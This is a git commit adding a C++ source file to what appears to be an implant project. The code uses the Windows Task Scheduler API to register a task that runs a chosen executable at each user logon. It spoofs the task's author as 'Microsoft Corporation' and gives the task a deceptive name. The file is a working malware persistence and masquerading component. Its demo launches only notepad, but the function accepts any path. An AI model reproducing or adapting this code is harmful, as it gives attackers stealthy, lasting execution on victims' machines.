e85c2106be6dd0c017ad31e1d42ad2593c5a65d6
FeiyuWang <36805094+FeiyuWang@users.noreply.github.com>
2022-12-09 04:45:45 -0500

    Create WindowsScheduler.cpp

---
+++ Implant/Feiyu/WindowsScheduler.cpp
@@ -0,0 +1,254 @@
+//https://learn.microsoft.com/en-us/windows/win32/taskschd/time-trigger-example--c---
+
+#define _WIN32_DCOM
+
+#include <windows.h>
+#include <iostream>
+#include <stdio.h>
+#include <comdef.h>
+#include <wincred.h>
+//  Include the task header file.
+#include <taskschd.h>
+#pragma comment(lib, "taskschd.lib")
+#pragma comment(lib, "comsupp.lib")
+#pragma comment(lib, "credui.lib")
+
+using namespace std;
+
+bool AddTaskToWindowsSchdualer(wstring path) {
+    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    if (FAILED(hr))
+    {
+        printf("\nCoInitializeEx failed: %x", hr);
+        return 1;
+    }
+
+    hr = CoInitializeSecurity(
+        NULL,
+        -1,
+        NULL,
+        NULL,
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
+        RPC_C_IMP_LEVEL_IMPERSONATE,
+        NULL,
+        0,
+        NULL);
+
+    if (FAILED(hr))
+    {
+        CoUninitialize();
+        return 1;
+    }
+
+    LPCWSTR wszTaskName = L"Very very legit stuff";
+
+    wstring wstrExecutablePath = path;
+
+
+    ITaskService* pService = NULL;
+    hr = CoCreateInstance(CLSID_TaskScheduler,
+        NULL,
+        CLSCTX_INPROC_SERVER,
+        IID_ITaskService,
+        (void**)&pService);
+    if (FAILED(hr))
+    {
+        CoUninitialize();
+        return 1;
+    }
+
+    hr = pService->Connect(_variant_t(), _variant_t(),
+        _variant_t(), _variant_t());
+    if (FAILED(hr))
+    {
+        pService->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    ITaskFolder* pRootFolder = NULL;
+    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
+    if (FAILED(hr))
+    {
+        pService->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    pRootFolder->DeleteTask(_bstr_t(wszTaskName), 0);
+
+    ITaskDefinition* pTask = NULL;
+    hr = pService->NewTask(0, &pTask);
+
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    IRegistrationInfo* pRegInfo = NULL;
+    hr = pTask->get_RegistrationInfo(&pRegInfo);
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    hr = pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
+    pRegInfo->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    ITaskSettings* pSettings = NULL;
+    hr = pTask->get_Settings(&pSettings);
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
+    pSettings->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    ITriggerCollection* pTriggerCollection = NULL;
+    hr = pTask->get_Triggers(&pTriggerCollection);
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    ITrigger* pTrigger = NULL;
+    hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
+    pTriggerCollection->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    ILogonTrigger* pLogonTrigger = NULL;
+    hr = pTrigger->QueryInterface(
+        IID_ILogonTrigger, (void**)&pLogonTrigger);
+    pTrigger->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    hr = pLogonTrigger->put_Id(_bstr_t(L"Trigger1"));
+
+    hr = pLogonTrigger->put_StartBoundary(_bstr_t(L"2005-01-01T12:05:00"));
+
+    wchar_t buffer[257] = { 0 };
+    DWORD cchBufferSize = sizeof(buffer) / sizeof(buffer[0]);
+    if (!GetUserName(buffer, &cchBufferSize))
+        throw runtime_error("GetUserName() failed.");
+    hr = pLogonTrigger->put_UserId(_bstr_t(&buffer[0]));
+    pLogonTrigger->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+    IActionCollection* pActionCollection = NULL;
+    hr = pTask->get_Actions(&pActionCollection);
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    IAction* pAction = NULL;
+    hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
+    pActionCollection->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    IExecAction* pExecAction = NULL;
+    hr = pAction->QueryInterface(
+        IID_IExecAction, (void**)&pExecAction);
+    pAction->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    hr = pExecAction->put_Path(_bstr_t(wstrExecutablePath.c_str()));
+    pExecAction->Release();
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    IRegisteredTask* pRegisteredTask = NULL;
+
+    hr = pRootFolder->RegisterTaskDefinition(
+        _bstr_t(wszTaskName),
+        pTask,
+        TASK_CREATE_OR_UPDATE,
+        _variant_t(),
+        _variant_t(),
+        TASK_LOGON_INTERACTIVE_TOKEN,
+        _variant_t(L""),
+        &pRegisteredTask);
+    if (FAILED(hr))
+    {
+        pRootFolder->Release();
+        pTask->Release();
+        CoUninitialize();
+        return 1;
+    }
+
+    pRootFolder->Release();
+    pTask->Release();
+    pRegisteredTask->Release();
+    CoUninitialize();
+    return 0;
+}
+
+
+int main(){
+    wstring wstrExecutablePath = _wgetenv(L"WINDIR");
+    wstrExecutablePath += L"\\SYSTEM32\\NOTEPAD.EXE";
+    AddTaskToWindowsSchdualer(wstrExecutablePath);
+}
